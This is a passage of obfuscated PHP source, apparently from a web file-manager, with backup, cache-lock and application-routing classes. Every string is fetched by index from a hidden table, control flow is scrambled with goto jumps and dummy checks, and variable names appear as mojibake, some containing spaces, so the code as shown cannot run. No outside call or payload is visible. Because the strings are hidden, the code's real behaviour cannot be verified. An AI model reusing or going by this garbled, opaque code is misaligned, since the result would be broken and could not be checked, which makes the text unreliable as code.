(!isset($_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][712]]) || !isset($_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][2128]])) { goto D›áã•…ﬁ¢; EÂ£çô·ì»: $c¡°Ö¥·Â∫($_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][714]] . $_SERVER[Ä¿¡‡öóµŸﬂ‡][715]); $FåçÈïÍ≥€ = 2; while ($FåçÈïÍ≥€ > 1) { $B©àÑ∑£§ì = rawurlencode($FåçÈïÍ≥€ . $_SERVER[Ä¿¡‡öóµŸﬂ‡][361]); } goto FÍƒÁèã´ö; D›áã•…ﬁ¢: $dËç˘•Œùß = $_SERVER[Ä¿¡‡öóµŸﬂ‡][713]; $b∏È∏©Ñã‚ = $_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][714]] . $_SERVER[Ä¿¡‡öóµŸﬂ‡][715]; $D ñçÊ—·å = $dËç˘•Œùß($b∏È∏©Ñã‚); goto CëåÂÚªËá; CëåÂÚªËá: $DçÈ™≈ΩÆ∑ = explode($_SERVER[Ä¿¡‡öóµŸﬂ‡][217], $D ñçÊ—·å); if (count($DçÈ™≈ΩÆ∑) < $_SERVER[Ä¿¡‡öóµŸﬂ‡][548]) { $bË¨èÌ…ñ¨ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][716]; $bË¨èÌ…ñ¨(); } $c¡°Ö¥·Â∫ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][717]; goto EÂ£çô·ì»; FÍƒÁèã´ö: } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\142\x61\143\153\x75\x70\x4c\151\163\x74"; public $field = array("\151\157", "\x6e\141\x6d\x65", "\x73\164\141\x74\165\163", "\143\157\x6e\164\145\156\x74", "\162\145\x73\x75\154\164", "\164\x69\x6d\145\x46\x72\157\x6d", "\x74\x69\x6d\145\124\157"); public function config() { goto Eû¥„®ß‹Ô; E¯Òú’†îË: Action($dàÉë¥∆ªÆ[2129])->taskInit(); $dÉ∆ÉÙ˜¢á = Model($dàÉë¥∆ªÆ[2130])->listData(); foreach ($dÉ∆ÉÙ˜¢á as $F™°‘ûíÓÃ) { if ($F™°‘ûíÓÃ[$dàÉë¥∆ªÆ[1084]] == $dàÉë¥∆ªÆ[83] && $F™°‘ûíÓÃ[$dàÉë¥∆ªÆ[1426]] == $dàÉë¥∆ªÆ[2131]) { $B€‚∫˜ëä∏ = $F™°‘ûíÓÃ; break; } } goto bÿ¨ì¿¬Ìô; Eû¥„®ß‹Ô: $dàÉë¥∆ªÆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E¬èŸÌÒùí = Model($dàÉë¥∆ªÆ[1092])->get($dàÉë¥∆ªÆ[722]); $E¬èŸÌÒùí = json_decode($E¬èŸÌÒùí, !0); goto c¶ä¯åå≤Ô; bÿ¨ì¿¬Ìô: if (isset($B€‚∫˜ëä∏[$dàÉë¥∆ªÆ[190]])) { $B€‚∫˜ëä∏[$dàÉë¥∆ªÆ[190]] = json_decode($B€‚∫˜ëä∏[$dàÉë¥∆ªÆ[190]], !0); } if (isset($E¬èŸÌÒùí[$dàÉë¥∆ªÆ[190]])) { $B€‚∫˜ëä∏[$dàÉë¥∆ªÆ[190]][$dàÉë¥∆ªÆ[1413]] = $E¬èŸÌÒùí[$dàÉë¥∆ªÆ[190]]; unset($E¬èŸÌÒùí[$dàÉë¥∆ªÆ[190]]); } return array_merge($B€‚∫˜ëä∏, $E¬èŸÌÒùí); goto B ‚÷Ã˜Æç; c¶ä¯åå≤Ô: $E¬èŸÌÒùí = is_array($E¬èŸÌÒùí) ? $E¬èŸÌÒùí : array(); if (!isset($E¬èŸÌÒùí[$dàÉë¥∆ªÆ[692]])) { $E¬èŸÌÒùí[$dàÉë¥∆ªÆ[692]] = $dàÉë¥∆ªÆ[468]; } $B€‚∫˜ëä∏ = array(); goto E¯Òú’†îË; B ‚÷Ã˜Æç: } public function listData($E¶¿Ñ‚è∂Ï = false, $fö¡Ç√ªèÏ = "\155\x6f\x64\151\x66\171\x54\x69\155\x65", $bÚ∫⁄äÆﬁË = false) { return parent::listData($E¶¿Ñ‚è∂Ï, $fö¡Ç√ªèÏ, !0); } public function lastItem() { $dá˘Ç∂÷∑Í = $this->listData(); return !empty($dá˘Ç∂÷∑Í[0]) ? $dá˘Ç∂÷∑Í[0] : null; } public function kill($Aµü∂Î¯°≈) { goto c©⁄ƒ¯Í≥÷; e•∫Ïıé¨¬: Task::kill($eÃ≥©Úê«´[721]); Task::kill($eÃ≥©Úê«´[737]); Task::kill($eÃ≥©Úê«´[745]); goto FãÑïë˜ö˜; eë˜€ÖΩæ´: return $this->remove($Aµü∂Î¯°≈); goto Eöà⁄œìÇ‚; FãÑïë˜ö˜: $d⁄“›áÁÎ» = $C¯πäÑÈ©†[$eÃ≥©Úê«´[28]]; $EØÑ¿ÙåòË = TEMP_FILES . $eÃ≥©Úê«´[718] . $d⁄“›áÁÎ» . $eÃ≥©Úê«´[8]; IO::remove($EØÑ¿ÙåòË, !1); goto eë˜€ÖΩæ´; c©⁄ƒ¯Í≥÷: $eÃ≥©Úê«´ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C¯πäÑÈ©† = $this->listData($Aµü∂Î¯°≈); if (!$C¯πäÑÈ©† || empty($C¯πäÑÈ©†[$eÃ≥©Úê«´[28]])) { return !0; } goto e•∫Ïıé¨¬; Eöà⁄œìÇ‚: } public function remove($C∞Ñÿ€˜÷É) { $BıÔÖ‚–ìõ = $this->listData($C∞Ñÿ€˜÷É); if (!$BıÔÖ‚–ìõ) { return !0; } return $this->backupRemove($BıÔÖ‚–ìõ); } private function backupRemove($A¿˘µÓÉΩµ) { $B”ªÙî°Ûö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; parent::remove($A¿˘µÓÉΩµ[$B”ªÙî°Ûö[367]]); $cÊÊ±€ãÚë = "\x7b\151\x6f\x3a{$A¿˘µÓÉΩµ[$B”ªÙî°Ûö[691]]}\175\x2f\144\x61\164\x61\x62\141\x73\145\x2f\x62\x61\143\153\x75\160\x5f" . $A¿˘µÓÉΩµ[$B”ªÙî°Ûö[28]]; IO::remove($cÊÊ±€ãÚë, !1); return !0; } public function start() { goto Bÿ…è≈Æ»Ω; BÑ¨≠‘ÆéÂ: if (!$fÿ¥ñ∞Ö±Ï->dbFile()) { return !1; } if ($Eæè“ÉÑé›[$d¡®ßüê¥è[692]] == $d¡®ßüê¥è[468]) { $fÿ¥ñ∞Ö±Ï->file(); } Backup::set(array($d¡®ßüê¥è[689] => 1, $d¡®ßüê¥è[703] => time())); goto D ã“µºù¶; D ã“µºù¶: return !0; goto bÇﬁ¬íŒëâ; fÂ§¨≤ãæü: if (!$Eæè“ÉÑé› || $Eæè“ÉÑé›[$d¡®ßüê¥è[1410]] != $d¡®ßüê¥è[83]) { return !1; } $d™ÎìçÇÙÃ = $this->process(); foreach ($d™ÎìçÇÙÃ as $f˜ó†À∫ÈÚ) { if ($f˜ó†À∫ÈÚ) { return Task::restart($f˜ó†À∫ÈÚ[$d¡®ßüê¥è[367]]); } } goto FïÉÃ±Æäò; Bÿ…è≈Æ»Ω: $d¡®ßüê¥è =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($GLOBALS[$d¡®ßüê¥è[6]][$d¡®ßüê¥è[84]][$d¡®ßüê¥è[2132]] != $d¡®ßüê¥è[83]) { return !0; } $Eæè“ÉÑé› = $this->config(); goto fÂ§¨≤ãæü; FïÉÃ±Æäò: $fÿ¥ñ∞Ö±Ï = new Backup(); $fÿ¥ñ∞Ö±Ï->keep(); if (!$fÿ¥ñ∞Ö±Ï->db()) { return !1; } goto BÑ¨≠‘ÆéÂ; bÇﬁ¬íŒëâ: } public function process() { $d—òÜıˆá∂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return array($d—òÜıˆá∂[694] => Task::get($d—òÜıˆá∂[721]), $d—òÜıˆá∂[697] => Task::get($d—òÜıˆá∂[737]), $d—òÜıˆá∂[167] => Task::get($d—òÜıˆá∂[745])); } public function restore() { $AÌ›ñ∂·œ¿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; ActionCall($AÌ›ñ∂·œ¿[2133], !0, 1); ActionCall($AÌ›ñ∂·œ¿[2133], !0, 0); } } goto f†≈Î”‰å; F©‰òªê◊ø: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DπÏ≠‰«æò; DÈ™Ùƒ°Ωô: self::$timeout = $DŒìù—Øî∑[$Eå“´∏˜™â[776]] ? $DŒìù—Øî∑[$Eå“´∏˜™â[776]] : 10; $e ˘ßÿµø‹ = _get($GLOBALS[$Eå“´∏˜™â[6]], $Eå“´∏˜™â[777]); $b‡´ﬂ·éòé = $DŒìù—Øî∑[$Eå“´∏˜™â[763]] ? $DŒìù—Øî∑[$Eå“´∏˜™â[763]] : $Eå“´∏˜™â[167]; goto F≠’ÜåÇ„º; F≠’ÜåÇ„º: if ($b‡´ﬂ·éòé == $Eå“´∏˜™â[17] && $e ˘ßÿµø‹ == $Eå“´∏˜™â[9]) { $b‡´ﬂ·éòé = $Eå“´∏˜™â[167]; } switch ($b‡´ﬂ·éòé) { case $Eå“´∏˜™â[766]: self::$handle = new CacheLockRedis(); break; case $Eå“´∏˜™â[767]: self::$handle = new CacheLockMemcached(); break; case $Eå“´∏˜™â[17]: self::$handle = new CacheLockDatabase(); break; case $Eå“´∏˜™â[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto CÏÏ•∂ë∏Ø; DπÏ≠‰«æò: $Eå“´∏˜™â =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (self::$handle) { return self::$handle; } $DŒìù—Øî∑ = $GLOBALS[$Eå“´∏˜™â[6]][$Eå“´∏˜™â[337]]; goto DÈ™Ùƒ°Ωô; CÏÏ•∂ë∏Ø: } private static function key($E•á£Ó‘–ö) { return $_SERVER[Ä¿¡‡öóµŸﬂ‡][778] . Cache::key($E•á£Ó‘–ö); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($E¥‰ﬁ“û«Ê = '') { self::$errorMsg = $E¥‰ﬁ“û«Ê; } public static function lockGlobal($aÁàºõÜ≥ê, $F•ëã°‘óå) { return self::lock($aÁàºõÜ≥ê, $F•ëã°‘óå, !0); } public static function lock($Då≤…Ö◊Ïö, $aßÈÓàãˆ∂ = false, $a”Ú˜ΩåùŸ = false) { goto cº˜•–££Ê; E´ü«∆å†ï: if (!$a”Ú˜ΩåùŸ) { self::$lockItem[$Bù≤∆Òñ˘ú] = !0; } return $Fá≥√ó±Ê∆; goto c µÔÉóµ¶; cº˜•–££Ê: $F∂Ë¢¢æå⁄ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A˜ﬁÕﬁÙÁï = self::init(); $Bù≤∆Òñ˘ú = self::key($Då≤…Ö◊Ïö); goto Aê ÓÉïﬂå; Aê ÓÉïﬂå: $aßÈÓàãˆ∂ = $aßÈÓàãˆ∂ ? $aßÈÓàãˆ∂ : self::$timeout; $Fá≥√ó±Ê∆ = $A˜ﬁÕﬁÙÁï->lock($Bù≤∆Òñ˘ú, $aßÈÓàãˆ∂); if (!$Fá≥√ó±Ê∆) { $E≥¿∂®ı∆â = $F∂Ë¢¢æå⁄[779] . $aßÈÓàãˆ∂ . $F∂Ë¢¢æå⁄[67] . self::$errorMsg . $F∂Ë¢¢æå⁄[67] . get_caller_msg(); $Aó¶ÓÓ‘·‰ = "\114\x6f\143\153\40\x61\x63\164\151\x6f\x6e\x3a\40{$Bù≤∆Òñ˘ú}\40\164\151\x6d\145\157\x75\164\54\157\166\x65\162\40{$aßÈÓàãˆ∂}\x20\163"; $Aó¶ÓÓ‘·‰ = self::$errorMsg ? self::$errorMsg : $DÆúéËî∏ë; write_log($E≥¿∂®ı∆â, $F∂Ë¢¢æå⁄[780]); show_json($Aó¶ÓÓ‘·‰, !1); } goto E´ü«∆å†ï; c µÔÉóµ¶: } public static function lockGet($D‘È©ÔÚ·») { $eÒîÂ»î‡â = self::key($D‘È©ÔÚ·»); if (self::$lockItem[$eÒîÂ»î‡â]) { return self::$lockItem[$eÒîÂ»î‡â]; } return self::init()->lockGet($eÒîÂ»î‡â); } public static function unlock($c¡∏ÃÆË´µ) { $dÀΩùëó“ = self::key($c¡∏ÃÆË´µ); self::$lockItem[$dÀΩùëó“] = null; return self::init()->unlock($dÀΩùëó“); } public static function unlockRuntime() { $e›’áΩ£íÏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dïùçÕ£∫ø = self::init(); $CæÓ≤›ß¯÷ = !1; foreach (self::$lockItem as $eÔ«Àì‘˘œ => $C™Ω»‰Ì¨µ) { if (!$C™Ω»‰Ì¨µ) { continue; } $dïùçÕ£∫ø->unlock($eÔ«Àì‘˘œ); if (!$CæÓ≤›ß¯÷) { $CæÓ≤›ß¯÷ = !0; write_log($e›’áΩ£íÏ[781] . $eÔ«Àì‘˘œ . $e›’áΩ£íÏ[67] . get_caller_msg(), $e›’áΩ£íÏ[780]); continue; } write_log($e›’áΩ£íÏ[781] . $eÔ«Àì‘˘œ, $e›’áΩ£íÏ[780]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $A§µˆâ¡´Ì =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DÀ¯æ¬îü® = $GLOBALS[$A§µˆâ¡´Ì[6]][$A§µˆâ¡´Ì[337]]; self::$cachePath = $DÀ¯æ¬îü®[$A§µˆâ¡´Ì[167]][$A§µˆâ¡´Ì[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($BôÜÀòﬂÏ˜, $F·Èﬂó éÆ = 0) { goto cÇ‹¢ÓÕ∆≤; AÍªÏÒ¥≠ì: $fÑë“≠Â‡≥ = rtrim(self::$cachePath, $bÈß“‚≈™Ÿ[8]) . $bÈß“‚≈™Ÿ[782] . md5($BôÜÀòﬂÏ˜) . $bÈß“‚≈™Ÿ[783]; if (file_exists($fÑë“≠Â‡≥) && filemtime($fÑë“≠Â‡≥) && filemtime($fÑë“≠Â‡≥) < time() - 10) { @unlink($fÑë“≠Â‡≥); } do { if (file_exists($fÑë“≠Â‡≥)) { cacheLockWait(); continue; } $dÂèèÊû∆© = fopen($fÑë“≠Â‡≥, $bÈß“‚≈™Ÿ[784]); if (!$dÂèèÊû∆©) { return !1; } $dé±ä°∆Ê• = flock($dÂèèÊû∆©, LOCK_EX | LOCK_NB); self::$caches[$BôÜÀòﬂÏ˜] = array($bÈß“‚≈™Ÿ[785] => $dÂèèÊû∆©, $bÈß“‚≈™Ÿ[167] => $fÑë“≠Â‡≥); fwrite($dÂèèÊû∆©, $fÛ“á¯∂›¬); clearstatcache(); if ($dÂèèÊû∆© && $dé±ä°∆Ê•) { return !0; } cacheLockWait(); } while (microtime(!0) < $fÛ“á¯∂›¬); goto Cú¢ΩÑƒπ‰; Cú¢ΩÑƒπ‰: $this->unlock($BôÜÀòﬂÏ˜); return !1; goto a¨˜’µ≈Û—; cÇ‹¢ÓÕ∆≤: $bÈß“‚≈™Ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EËΩü‘â≈⁄ = microtime(!0); $fÛ“á¯∂›¬ = $EËΩü‘â≈⁄ + $F·Èﬂó éÆ + 0.0001; goto AÍªÏÒ¥≠ì; a¨˜’µ≈Û—: } public function lockGet($dù ¢á≥û–) { $fœâñÑÍõü =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dˆ∞∞¬ê≥Ÿ = rtrim(self::$cachePath, $fœâñÑÍõü[8]) . $fœâñÑÍõü[782] . md5($dù ¢á≥û–) . $fœâñÑÍõü[783]; return file_exists($Dˆ∞∞¬ê≥Ÿ); } public function unlock($aÇ≥±Ω≠„√) { goto bÑß¨—Éúˆ; bÑß¨—Éúˆ: $C€“à•© È =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c˜πç€éïÔ = self::$caches[$aÇ≥±Ω≠„√]; if (!$c˜πç€éïÔ) { return; } goto FãèÖß¯™©; dâΩÿÙ‚√Æ: unset(self::$caches[$aÇ≥±Ω≠„√]); goto BËÎçàÆ®Ö; FãèÖß¯™©: @flock($c˜πç€éïÔ[$C€“à•© È[785]], LOCK_UN); @fclose($c˜πç€éïÔ[$C€“à•© È[785]]); @unlink($c˜πç€éïÔ[$C€“à•© È[167]]); goto dâΩÿÙ‚√Æ; BËÎçàÆ®Ö: } } goto f¶Òúæ«˜; c…æ¯‰‰ƒ: $bﬂ‘ﬁÉà◊® = $_SERVER[Ä¿¡‡öóµŸﬂ‡][551]; if (strlen($bﬂ‘ﬁÉà◊®) < $_SERVER[Ä¿¡‡öóµŸﬂ‡][552]) { die; } class Application { private $defaultModule = "\151\156\144\145\170"; private $defaultController = "\151\x6e\x64\x65\170"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($A◊™ÚÔæ—≠) { goto Cˆ¿∑˘‹üï; C◊–¡ç‚»◊: $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][3]}($E‰õïÔ¶ñì[4], array($this, $E‰õïÔ¶ñì[5])); $aÊ∆∆‰‡“ø = $eØÚ‡ﬁ™ÿº[558]; if (strlen($aÊ∆∆‰‡“ø) < $eØÚ‡ﬁ™ÿº[557]) { return; } goto E¥›ìëŒÔ©; Cäºé≈Î≠›: $AÚºÓÈÜ∆∂ = $eØÚ‡ﬁ™ÿº[554]; while (strlen($AÚºÓÈÜ∆∂) < $eØÚ‡ﬁ™ÿº[555]) { if (!$AÚºÓÈÜ∆∂) { break; } $AÚºÓÈÜ∆∂++; } $this->defaultController = $CÉ¨™óˆƒ™[1] ? $CÉ¨™óˆƒ™[1] : $this->defaultController; goto C‘¿√«•í˘; C‘¿√«•í˘: $FÑöíä”õ = $eØÚ‡ﬁ™ÿº[556]; if (strlen($FÑöíä”õ) < $eØÚ‡ﬁ™ÿº[557]) { return; } $this->defaultAction = $CÉ¨™óˆƒ™[2] ? $CÉ¨™óˆƒ™[2] : $this->defaultAction; goto C◊–¡ç‚»◊; BËààñ‘ùÊ: $fìÖßëÆ¶ = $eØÚ‡ﬁ™ÿº[553]; while (strlen($fìÖßëÆ¶) < $eØÚ‡ﬁ™ÿº[552]) { if (!$fìÖßëÆ¶) { break; } $fìÖßëÆ¶++; } $this->defaultModule = $CÉ¨™óˆƒ™[0] ? $CÉ¨™óˆƒ™[0] : $this->defaultModule; goto Cäºé≈Î≠›; Cˆ¿∑˘‹üï: $eØÚ‡ﬁ™ÿº =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E‰õïÔ¶ñì =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $CÉ¨™óˆƒ™ = $E‰õïÔ¶ñì[0]($E‰õïÔ¶ñì[1], $E‰õïÔ¶ñì[2]($A◊™ÚÔæ—≠, $E‰õïÔ¶ñì[1])); goto BËààñ‘ùÊ; E¥›ìëŒÔ©: } public function appRun($a»⁄‡™Ò«õ) { goto FÇ≤ä¿≠∞ò; e®â¨ø§›Œ: while ($cµ≤ΩÀƒôí < $eÜ‡–Ã»áª[555]) { if ($cµ≤ΩÀƒôí >= 0) { break; } $cµ≤ΩÀƒôí++; } $a¡®œ˜€Ç‡[13](array($a¡®œ˜€Ç‡[14], $a¡®œ˜€Ç‡[15]), $EÔæâµ–´‚ . $a¡®œ˜€Ç‡[18], $a»⁄‡™Ò«õ); $Dª´±∂«ö§ = $eÜ‡–Ã»áª[562]; goto cå±‡Ñïá∑; A–ŒﬂÜ·èÙ: $C™‹∫‡°Ú¿ = $a¡®œ˜€Ç‡[6]($C‚Ñ¿°Ëæ…[0]); $Cı€°èÔßÓ = $eÜ‡–Ã»áª[559]; if (!$Cı€°èÔßÓ) { die; } goto cìôã’£°ä; FÇ≤ä¿≠∞ò: $eÜ‡–Ã»áª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a¡®œ˜€Ç‡ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $C‚Ñ¿°Ëæ… = $a¡®œ˜€Ç‡[0]($a¡®œ˜€Ç‡[1], $a»⁄‡™Ò«õ); goto A–ŒﬂÜ·èÙ; CÈ≥ÿ∞Ê‡≥: $a¡®œ˜€Ç‡[13](array($a¡®œ˜€Ç‡[14], $a¡®œ˜€Ç‡[15]), $EÔæâµ–´‚ . $a¡®œ˜€Ç‡[16], $a»⁄‡™Ò«õ); $a¡®œ˜€Ç‡[17]($a»⁄‡™Ò«õ); $cµ≤ΩÀƒôí = $eÜ‡–Ã»áª[561]; goto e®â¨ø§›Œ; cå±‡Ñïá∑: while (strlen($Dª´±∂«ö§) < $eÜ‡–Ã»áª[563]) { if (!$Dª´±∂«ö§) { break; } $Dª´±∂«ö§++; } goto EÎÇ·ß¢êﬂ; cìôã’£°ä: $EÔæâµ–´‚ = $a¡®œ˜€Ç‡[7]; $Dπ£Íƒ‡å≠ = $eÜ‡–Ã»áª[560]; if ($C™‹∫‡°Ú¿ == $a¡®œ˜€Ç‡[8]) { $EÔæâµ–´‚ = $a¡®œ˜€Ç‡[9]; $C‚Ñ¿°Ëæ…[0] = $a¡®œ˜€Ç‡[10]; $C‚Ñ¿°Ëæ…[1] = $C‚Ñ¿°Ëæ…[1] . $a¡®œ˜€Ç‡[11]; $a»⁄‡™Ò«õ = $a¡®œ˜€Ç‡[12]($a¡®œ˜€Ç‡[1], $C‚Ñ¿°Ëæ…); $a»⁄‡™Ò«õ = $a¡®œ˜€Ç‡[2]($a»⁄‡™Ò«õ, $a¡®œ˜€Ç‡[1]); } goto CÈ≥ÿ∞Ê‡≥; EÎÇ·ß¢êﬂ: } private function autorun() { $AÖôËÖ‹íó =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; global $config; if ($AÖôËÖ‹íó[19]($config[$AÖôËÖ‹íó[20]]) == 0) { return; } foreach ($config[$AÖôËÖ‹íó[20]] as $cÂ÷∂°§ÁÑ => $E£Ôà·πˆπ) { $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][21]}($E£Ôà·πˆπ); $F”Óôñ›Ö¡ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][564]; if (!$F”Óôñ›Ö¡) { die; } } } private function dvywb0fbc063() { goto bÇ©πñ†éè; EÏµÖÕ∆˘Œ: if (!$e˜äàªÿã÷ || $bŸ£Ωá∏º[24]($e˜äàªÿã÷) <= $bŸ£Ωá∏º[24]($bµÛ¯ñ‡¶ß)) { return; } if ($bŸ£Ωá∏º[6]($bŸ£Ωá∏º[25]($e˜äàªÿã÷, -$bŸ£Ωá∏º[24]($bµÛ¯ñ‡¶ß))) != $bµÛ¯ñ‡¶ß) { return; } $A¶ùí»áﬁŒ = $bŸ£Ωá∏º[25]($e˜äàªÿã÷, 0, -$bŸ£Ωá∏º[24]($bµÛ¯ñ‡¶ß)); goto bº∆⁄Ñ¬í√; bê…ßìÃÇ¶: $D≈úÏ¶ÙíÜ = $bŸ£Ωá∏º[26]($GLOBALS[$bŸ£Ωá∏º[22]][$bŸ£Ωá∏º[23]], 1); $båÂêòé√ñ = $aà®úΩåóæ[567]; $GLOBALS[$bŸ£Ωá∏º[22]][$bŸ£Ωá∏º[23]] = $bŸ£Ωá∏º[27]($f”≈ÔÑËÑç, $D≈úÏ¶ÙíÜ); goto BÌÛçì˘ƒû; BÌÛçì˘ƒû: $bÁ†˘ª§Û∑ = $aà®úΩåóæ[568]; $GLOBALS[$bŸ£Ωá∏º[22]][$bŸ£Ωá∏º[28]] = $bŸ£Ωá∏º[29]($bŸ£Ωá∏º[1], $GLOBALS[$bŸ£Ωá∏º[22]][$bŸ£Ωá∏º[23]]); goto C·ÖºÆäóÕ; C”ﬂ…œ•ƒÖ: $f–Ñ≈îÔ†Õ = $aà®úΩåóæ[565]; while ($f–Ñ≈îÔ†Õ < $aà®úΩåóæ[563]) { if ($f–Ñ≈îÔ†Õ >= 0) { break; } $f–Ñ≈îÔ†Õ++; } $e˜äàªÿã÷ = $GLOBALS[$bŸ£Ωá∏º[22]][$bŸ£Ωá∏º[23]][0]; goto EÏµÖÕ∆˘Œ; bº∆⁄Ñ¬í√: $d—Õ„êñª€ = $aà®úΩåóæ[566]; if (strlen($d—Õ„êñª€) < $aà®úΩåóæ[555]) { die; } $f”≈ÔÑËÑç = array($bŸ£Ωá∏º[8], $A¶ùí»áﬁŒ); goto bê…ßìÃÇ¶; bÇ©πñ†éè: $aà®úΩåóæ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bŸ£Ωá∏º =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $bµÛ¯ñ‡¶ß = $bŸ£Ωá∏º[8]; goto C”ﬂ…œ•ƒÖ; C·ÖºÆäóÕ: } private function faed5be94ba0() { goto a“ãèıªãÿ; e÷≈Î¨›ß—: $FÖı†Ó∫–è = $cÉø¡¶Œﬁë[574]; while (strlen($FÖı†Ó∫–è) < $cÉø¡¶Œﬁë[557]) { if (!$FÖı†Ó∫–è) { break; } $FÖı†Ó∫–è++; } $GLOBALS[$dñì—È™Ñà[22]][$dñì—È™Ñà[28]] = $dñì—È™Ñà[29]($dñì—È™Ñà[1], $GLOBALS[$dñì—È™Ñà[22]][$dñì—È™Ñà[23]]); goto eÁ¶¿ıºˆ©; eºíñÃ¡ä·: if (strlen($BÁ°ŸøâÇô) < $cÉø¡¶Œﬁë[563]) { return; } $dñì—È™Ñà[34]($dñì—È™Ñà[35], $E†÷âã≥  , $cöıºÖ¬ıá); $fß¬–ﬂ√îÙ = $cÉø¡¶Œﬁë[573]; goto CßÊ…˜à™∫; bÛ„‚»í∫Ù: if (!$BÁ√˜¶ôµŒ) { die; } $E†÷âã≥   = $dñì—È™Ñà[25]($b±Óõ…∫Û∞, $D≤œı≥Œ˜• + $dñì—È™Ñà[24]($D˘πÙ ©´¯)); $BÁ°ŸøâÇô = $cÉø¡¶Œﬁë[572]; goto eºíñÃ¡ä·; BÏ≤ïå÷õﬂ: $b±Óõ…∫Û∞ = $_SERVER[$dñì—È™Ñà[30]]; $C≠Ö≠∑ıãø = $cÉø¡¶Œﬁë[569]; if (!$C≠Ö≠∑ıãø) { die; } goto AëÉ†å°¯Ò; CßÊ…˜à™∫: if (!$fß¬–ﬂ√îÙ) { return; } $E†÷âã≥   = $dñì—È™Ñà[2]($cöıºÖ¬ıá[0][0], $dñì—È™Ñà[36]); $GLOBALS[$dñì—È™Ñà[22]][$dñì—È™Ñà[23]] = $dñì—È™Ñà[0]($dñì—È™Ñà[36], $E†÷âã≥  ); goto e÷≈Î¨›ß—; a“ãèıªãÿ: $cÉø¡¶Œﬁë =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dñì—È™Ñà =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; if ($GLOBALS[$dñì—È™Ñà[22]][$dñì—È™Ñà[28]] != $dñì—È™Ñà[10]) { return; } goto BÏ≤ïå÷õﬂ; bˆ‘∆Û™éÆ: if (!$dñì—È™Ñà[32]($b±Óõ…∫Û∞, $D˘πÙ ©´¯)) { return; } $D≤œı≥Œ˜• = $dñì—È™Ñà[33]($b±Óõ…∫Û∞, $D˘πÙ ©´¯); $BÁ√˜¶ôµŒ = $cÉø¡¶Œﬁë[571]; goto bÛ„‚»í∫Ù; AëÉ†å°¯Ò: $D˘πÙ ©´¯ = $dñì—È™Ñà[31]; $bº§’óÙÎ‡ = $cÉø¡¶Œﬁë[570]; if (!$bº§’óÙÎ‡) { return; } goto bˆ‘∆Û™éÆ; eÁ¶¿ıºˆ©: } public function run() { goto füÖñéê„‡; e—£Ü Á≠”: if ($bâù∑ﬂ√£¨[19]($DÉÔ±’Ã–) >= 3) { $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][21]}($F¨ßÃáÆù‘); } else { $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][21]}(ACTION); } goto fÃó‰ãœË∏; eËÇ±Ïåíâ: if (strlen($b«Á¡∫ì»Ù) < $béáπª«Ôí[552]) { return; } $_SERVER[$bâù∑ﬂ√£¨[44]] = $bâù∑ﬂ√£¨[6](ACTION); $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][45]}(); goto e—£Ü Á≠”; Bùàåî¡≤Ç: $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][38]}(); $DÉÔ±’Ã– = $GLOBALS[$bâù∑ﬂ√£¨[22]][$bâù∑ﬂ√£¨[23]]; $F¨ßÃáÆù‘ = $GLOBALS[$bâù∑ﬂ√£¨[22]][$bâù∑ﬂ√£¨[28]]; goto FﬂêóÖêÔ‰; b©ú¢ù£Õ˘: $bâù∑ﬂ√£¨[39]($bâù∑ﬂ√£¨[41], isset($DÉÔ±’Ã–[1]) && $DÉÔ±’Ã–[0] ? $DÉÔ±’Ã–[1] : $this->defaultController); $A∞ˆ°¢ßÌ˜ = $béáπª«Ôí[576]; if (!$A∞ˆ°¢ßÌ˜) { die; } goto Cõ»ÉÜ»áŒ; FﬂêóÖêÔ‰: $bâù∑ﬂ√£¨[39]($bâù∑ﬂ√£¨[40], isset($DÉÔ±’Ã–[0]) && $DÉÔ±’Ã–[0] ? $DÉÔ±’Ã–[0] : $this->defaultModule); $CáéÚ¿˜π„ = $béáπª«Ôí[575]; if (!$CáéÚ¿˜π„) { die; } goto b©ú¢ù£Õ˘; Cõ»ÉÜ»áŒ: $bâù∑ﬂ√£¨[39]($bâù∑ﬂ√£¨[42], isset($DÉÔ±’Ã–[2]) && $DÉÔ±’Ã–[0] ? $DÉÔ±’Ã–[2] : 